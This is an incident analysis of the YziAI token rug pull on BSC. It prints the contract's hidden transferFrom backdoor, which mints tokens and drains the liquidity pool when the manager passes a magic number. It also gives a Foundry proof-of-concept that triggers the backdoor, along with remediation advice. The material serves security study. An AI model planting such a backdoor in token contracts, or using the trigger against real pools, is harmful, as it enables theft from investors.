# YziAI Token — transferFrom Backdoor Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-25 |
| **Protocol** | YziAI Token |
| **Chain** | BSC |
| **Loss** | ~376 BNB |
| **Attacker** | [0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453](https://bscscan.com/address/0x63fc3ff98de8d5ca900e68e6c6f41a7ca949c453) |
| **Attack Tx** | [0x4821392c...](https://bscscan.com/tx/0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8) |
| **Vulnerable Contract** | [0x7fdff64bf87bad52e6430bda30239bd182389ee3](https://bscscan.com/address/0x7fdff64bf87bad52e6430bda30239bd182389ee3) |
| **Root Cause** | Hidden backdoor in transferFrom activated when a special magic number (1199002345) is passed as the amount |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/YziAIToken_exp.sol) |

---

## 1. Vulnerability Overview

The `transferFrom()` function in the YziAI token contract contained a hidden backdoor that activated when a special magic number (1199002345) was passed as the amount and `msg.sender` matched a specific `manager` address. When triggered, the backdoor minted a massive amount of tokens, forcibly drained liquidity from the LP pool, and swapped it for BNB. This is a rug pull style attack.

## 2. Vulnerable Code Analysis

```solidity
// ❌ transferFrom with hidden malicious backdoor
function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    // ❌ Hidden backdoor: bypasses normal behavior when specific conditions are met
    if (msg.sender == manager && amount == 1199002345) {
        // Mint massive amount of tokens
        _mint(address(this), supply * 10000);
        // Approve router
        _approve(address(this), router, supply * 100000);

        // Swap all tokens in the LP pool for BNB (rug pull)
        path.push(address(this));
        path.push(IUniswapV2Router02(router).WETH());
        IUniswapV2Router02(router).swapExactTokensForETH(
            balanceOf(to) * 1000,  // uses tokens at the `to` address
            1,
            path,
            manager,  // ❌ sends ETH to manager
            block.timestamp + 1e10
        );
        return true;
    }
    // Normal transferFrom logic...
}

// ✅ Correct standard transferFrom — no backdoor
function transferFrom(address from, address to, uint256 amount)
    public virtual override returns (bool) {
    _spendAllowance(from, msg.sender, amount);
    _transfer(from, to, amount);
    return true;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: token (5).sol
contract YziLabs {
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {  // ❌ Vulnerability
        if(msg.sender == manager && amount == 1199002345) {
            _mint(address(this), supply * 10000);
            _approve(address(this), router, supply * 100000);

            path.push(address(this));
            path.push(IUniswapV2Router02(router).WETH());

            IUniswapV2Router02(router).swapExactTokensForETH(
                balanceOf(to) * 1000, 
                1, 
                path, 
                manager, 
                block.timestamp + 1e10
            );
            return true;
        }  

        if(tx.origin == manager || traders[tx.origin]) {
            return super.transferFrom(from, to, amount);
        } else {
            if (to.code.length > 0) {
                uint256 pairBalance = balanceOf(IUniswapV2Factory(factory).getPair(address(this), IUniswapV2Router02(router).WETH()));
                if(min2 != 0) {
                    require(amount > (pairBalance / 1000) * min1 && amount < (pairBalance / 1000) * min2 || amount > pairBalance / 100 * 95);
                }
                return super.transferFrom(from, to, amount);
            } else {
                return super.transferFrom(from, to, amount);
            }
        }
    }
```

## 3. Attack Flow (ASCII Diagram)

```
manager (deployer/attacker)
  │
  ├─[1]─► Deploy YziAI token (backdoor code hidden inside)
  │
  ├─[2]─► Regular investors buy tokens (liquidity accumulates in LP pool)
  │
  ├─[3]─► manager calls transferFrom(CAKE_LP, CAKE_LP, 1199002345)
  │         └─► backdoor activated by magic number
  │
  ├─[4]─► Inside the backdoor:
  │         ├─► mint supply * 10000 tokens
  │         ├─► approve router
  │         └─► swap all LP pool tokens for BNB
  │
  └─[5]─► manager receives ~376 BNB (rug pull complete)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract YziAIToken_exp is BaseTestWithBalanceLog {
    address attacker = 0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453; // manager

    function testExploit() public {
        emit log_named_decimal_uint(
            "BNB balance before attack",
            attacker.balance,
            18
        );

        vm.startPrank(attacker);

        // [3] Trigger backdoor with magic number (1199002345)
        // Both from and to are set to CAKE_LP
        IERC20(YziAI).transferFrom(
            CAKE_LP,   // from: LP pool
            CAKE_LP,   // to: LP pool (uses balanceOf(to), so entire LP balance)
            1_199_002_345  // ❌ magic number that activates the backdoor
        );

        vm.stopPrank();

        emit log_named_decimal_uint(
            "BNB balance after attack",
            attacker.balance,
            18
        );
        // ~376 BNB obtained
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Backdoor / Rug Pull |
| **Attack Technique** | Hidden privileged admin function |
| **DASP Category** | Access Control |
| **CWE** | CWE-506: Embedded Malicious Code |
| **Severity** | Critical |
| **Attack Complexity** | Low (intentional attack by deployer) |

## 6. Remediation Recommendations

1. **Code Audit**: Always perform an independent smart contract audit before deployment, with particular scrutiny of any standard function overrides.
2. **Source Code Verification**: Publish source code on Etherscan/BscScan and subject it to community review.
3. **Immutable Contracts**: Where possible, use non-upgradeable contracts and minimize admin privileges.
4. **Token Standard Compliance**: Do not insert additional logic when overriding ERC20 standard functions.

## 7. Lessons Learned

- **Magic Number Backdoors**: Code that reacts to specific input values allows a malicious deployer to execute a rug pull at any time.
- **Importance of Code Transparency**: All DeFi tokens should have their source code verified and publicly available before deployment.
- **Review the Trust Model**: Always verify what the admin key is capable of doing. If the "manager" role can compromise the entire protocol, the system is not truly decentralized.
- **Due Diligence Before Investing**: Backdoors like this are difficult to detect without a code review, making audit report verification essential.